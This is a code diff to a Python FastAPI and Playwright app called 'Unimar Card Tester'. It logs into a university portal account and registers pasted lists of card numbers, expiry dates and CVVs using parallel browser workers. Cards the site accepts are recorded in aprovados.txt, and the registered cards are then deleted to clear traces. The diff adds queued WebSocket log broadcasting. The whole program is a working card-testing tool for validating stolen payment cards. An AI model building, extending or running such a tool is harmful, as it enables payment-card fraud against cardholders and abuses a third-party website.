@@ -11,7 +11,7 @@ from fastapi import FastAPI, WebSocket, WebSocketDisconnect
 from fastapi.responses import HTMLResponse
 from pydantic import BaseModel
 
-from playwright.async_api import async_playwright, Browser, BrowserContext
+from playwright.async_api import async_playwright, Browser
 
 # ===================== CONFIG & LOGGING =====================
 logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
@@ -24,9 +24,8 @@ EMAIL = os.getenv("UNIMAR_EMAIL")
 SENHA = os.getenv("UNIMAR_SENHA")
 NOME_FIXO = "Bruna Mendes"
 
-# Validar credenciais no startup
 if not EMAIL or not SENHA:
-    raise ValueError("Credenciais UNIMAR_EMAIL e UNIMAR_SENHA devem ser definidas no ambiente.")
+    raise ValueError("Credenciais UNIMAR_EMAIL e UNIMAR_SENHA devem ser definidas.")
 
 # ===================== ESTADO THREAD-SAFE =====================
 class AppState:
@@ -36,7 +35,6 @@ class AppState:
         self.total_cartoes = 0
         self.processados = 0
         self.aprovados = 0
-        self.fila_vazia = False
         self.tarefas_concluidas = 0
         self.lock = asyncio.Lock()
 
@@ -54,33 +52,45 @@ class AppState:
             self.total_cartoes = 0
             self.processados = 0
             self.aprovados = 0
-            self.fila_vazia = False
             self.tarefas_concluidas = 0
 
 estado = AppState()
 
+# Fila de broadcast para garantir entrega
+broadcast_queue = asyncio.Queue()
+
+async def process_broadcast_queue():
+    """Processa a fila de mensagens enviadas para os clientes."""
+    while True:
+        message = await broadcast_queue.get()
+        disconnected = []
+        for client in list(estado.clients):
+            try:
+                await client.send_json(message)
+            except Exception:
+                disconnected.append(client)
+        
+        for client in disconnected:
+            estado.clients.discard(client)
+        broadcast_queue.task_done()
+
 async def log(mensagem: str):
     logger.info(mensagem)
-    await broadcast("log", {"mensagem": mensagem})
+    # Envia para a fila de broadcast em vez de criar task direta
+    await broadcast_queue.put({"type": "log", "mensagem": mensagem})
 
 async def broadcast(type: str, data: dict = None):
     if data is None:
         data = {}
     message = {"type": type, **data}
-    disconnected = []
-    for client in list(estado.clients):
-        try:
-            await client.send_json(message)
-        except Exception:
-            disconnected.append(client)
-    
-    for client in disconnected:
-        estado.clients.discard(client)
+    await broadcast_queue.put(message)
 
 # ===================== LIFESPAN =====================
 @asynccontextmanager
 async def lifespan(app: FastAPI):
     Path("aprovados.txt").touch(exist_ok=True)
+    # Inicia o worker de broadcast
+    asyncio.create_task(process_broadcast_queue())
     yield
 
 app = FastAPI(title="Unimar Card Tester", lifespan=lifespan)
@@ -103,7 +113,6 @@ async def limpar_cartoes_antigos(page):
         await page.goto(URL_MEUS_CARTOES, wait_until="networkidle", timeout=30000)
         await asyncio.sleep(2)
 
-        # Estratégia mais robusta: tentar remover até não haver mais botões ou timeout
         while True:
             botoes = page.get_by_role("button", name="Remover")
             count = await botoes.count()
@@ -113,7 +122,6 @@ async def limpar_cartoes_antigos(page):
             await botoes.first.click(force=True)
             await asyncio.sleep(1)
             
-            # Tentar confirmar
             try:
                 confirm = page.get_by_role("button", name="Sim").or_(page.get_by_role("button", name="Confirmar"))
                 if await confirm.is_visible():
@@ -121,14 +129,13 @@ async def limpar_cartoes_antigos(page):
                     await page.wait_for_load_state("networkidle")
                     await asyncio.sleep(1.5)
             except Exception:
-                pass # Às vezes remove sem confirmação
+                pass
 
         logger.info("[Faxina] Limpeza concluída.")
     except Exception as e:
         logger.error(f"[Faxina] Erro: {e}")
 
 async def criar_sessao_mestre(playwright):
-    """Cria a sessão mestre e salva o estado de autenticação."""
     try:
         logger.info("[Auth] Login mestre...")
         browser = await playwright.chromium.launch(headless=True, args=["--no-sandbox"])
@@ -140,9 +147,7 @@ async def criar_sessao_mestre(playwright):
         await page.get_by_role("textbox", name="Senha").fill(SENHA)
         await page.get_by_role("button", name="Entrar").click()
 
-        # Aguardar sucesso no login
         await page.wait_for_selector("text=Meus Cartões", timeout=30000)
-        
         await limpar_cartoes_antigos(page)
         await context.storage_state(path="sessao_unimar.json")
         
@@ -155,12 +160,12 @@ async def criar_sessao_mestre(playwright):
         return False
 
 async def processar_item(page, item: tuple, estado_fluxo: dict):
-    """Processa um único cartão em uma página já logada."""
     indice, linha, tentativas = item
     
     try:
         numero, mes, ano, cvv = [x.strip() for x in linha.split("|")]
         logger.info(f"[Item {indice}] Processando ...{numero[-4:]}")
+        await log(f"[Canal Ativo] Testando cartão final {numero[-4:]}")
 
         await page.goto(URL_MEUS_CARTOES, wait_until="networkidle")
         await asyncio.sleep(random.uniform(0.5, 1.5))
@@ -174,13 +179,12 @@ async def processar_item(page, item: tuple, estado_fluxo: dict):
         await page.get_by_label("Ano").select_option(ano)
         await page.get_by_role("textbox", name="CVV").fill(cvv)
 
-        # Contar removidos antes para detectar novo
         botoes_antes = await page.get_by_role("button", name="Remover").count()
         
         await page.get_by_role("button", name="Registrar Cartão de Crédito").click(force=True)
         
         aprovado = False
-        for _ in range(20): # Timeout de ~30s
+        for _ in range(20):
             if not estado.rodando:
                 break
                 
@@ -189,7 +193,6 @@ async def processar_item(page, item: tuple, estado_fluxo: dict):
                 aprovado = True
                 break
             
-            # Checagem de erro no texto
             body_text = await page.locator("body").inner_text()
             if any(x in body_text.lower() for x in ["inválida", "recusado", "erro", "declined"]):
                 break
@@ -202,7 +205,6 @@ async def processar_item(page, item: tuple, estado_fluxo: dict):
             await estado.increment_aprovados()
             estado_fluxo["houve_aprovados"] = True
             
-            # Salvar em arquivo imediatamente
             with open("aprovados.txt", "a") as f:
                 f.write(f"{linha}\n")
         else:
@@ -211,23 +213,23 @@ async def processar_item(page, item: tuple, estado_fluxo: dict):
 
     except Exception as e:
         logger.error(f"[Item {indice}] Erro crítico: {e}")
+        await log(f"[Erro] Falha no item {indice}: {str(e)[:50]}")
 
 async def worker(id_worker: int, browser: Browser, fila: asyncio.Queue, estado_fluxo: dict):
-    """Worker dedicado: cria seu próprio contexto para isolamento."""
     context = None
     page = None
     try:
         logger.info(f"[Worker {id_worker}] Iniciado.")
+        await log(f"[Sistema] Worker {id_worker} iniciado.")
+        
         context = await browser.new_context(storage_state="sessao_unimar.json")
         page = await context.new_page()
         
-        # Pre-aquecimento
         await page.goto(URL_MEUS_CARTOES, wait_until="networkidle")
 
         while estado.rodando:
             try:
                 if fila.empty():
-                    # Pequena espera para garantir que não há items sendo adicionados
                     await asyncio.sleep(0.5)
                     if fila.empty():
                         break
@@ -259,11 +261,12 @@ async def worker(id_worker: int, browser: Browser, fila: asyncio.Queue, estado_f
         if context:
             await context.close()
         logger.info(f"[Worker {id_worker}] Finalizado.")
+        await log(f"[Sistema] Worker {id_worker} finalizado.")
 
 async def processar_cartoes(texto_cartoes: str, num_canais: int):
     try:
         linhas = [l.strip() for l in texto_cartoes.splitlines() if l.strip()]
-        linhas = list(dict.fromkeys(linhas)) # Remove duplicatas mantendo ordem
+        linhas = list(dict.fromkeys(linhas))
 
         await estado.reset()
         estado.total_cartoes = len(linhas)
@@ -277,6 +280,7 @@ async def processar_cartoes(texto_cartoes: str, num_canais: int):
             num_canais = 1
 
         logger.info(f"[Sistema] Iniciando: {num_canais} workers, {estado.total_cartoes} cartões.")
+        await log(f"[Sistema] Iniciando processo com {num_canais} canais.")
 
         fila = asyncio.Queue()
         for idx, linha in enumerate(linhas, 1):
@@ -291,12 +295,11 @@ async def processar_cartoes(texto_cartoes: str, num_canais: int):
 
             tasks = [asyncio.create_task(worker(i, browser, fila, estado_fluxo)) for i in range(1, num_canais + 1)]
             
-            # Aguardar todos os workers terminarem
             await asyncio.gather(*tasks, return_exceptions=True)
 
-            # Faxina final se necessário
             if estado_fluxo["houve_aprovados"]:
                 logger.info("[Sistema] Faxina final...")
+                await log("[Sistema] Iniciando faxina final...")
                 try:
                     clean_context = await browser.new_context(storage_state="sessao_unimar.json")
                     clean_page = await clean_context.new_page()
@@ -309,9 +312,11 @@ async def processar_cartoes(texto_cartoes: str, num_canais: int):
 
     except Exception as e:
         logger.error(f"[ERRO CRÍTICO] {e}")
+        await log(f"[ERRO CRÍTICO] {e}")
     finally:
         estado.rodando = False
         logger.info("[Sistema] Processo finalizado.")
+        await log("[Sistema] Processo finalizado.")
 
 # ===================== ROTAS =====================
 class IniciarRequest(BaseModel):
@@ -335,17 +340,17 @@ async def parar():
         
     estado.rodando = False
     logger.info("⛔ Interrupção solicitada.")
+    await log("⛔ Interrupção solicitada pelo usuário.")
     await broadcast("status", {"rodando": False})
     return {"status": "parando"}
 
 @app.get("/", response_class=HTMLResponse)
 async def index():
-    # Fallback simples se o arquivo não existir
     try:
         with open("templates/index.html", encoding="utf-8") as f:
             return f.read()
     except FileNotFoundError:
-        return "<html><body><h1>UI não encontrada. Use a API.</h1></body></html>"
+        return "<html><body><h1>UI não encontrada.</h1></body></html>"
 
 if __name__ == "__main__":
     uvicorn.run("main:app", host="0.0.0.0", port=5000)
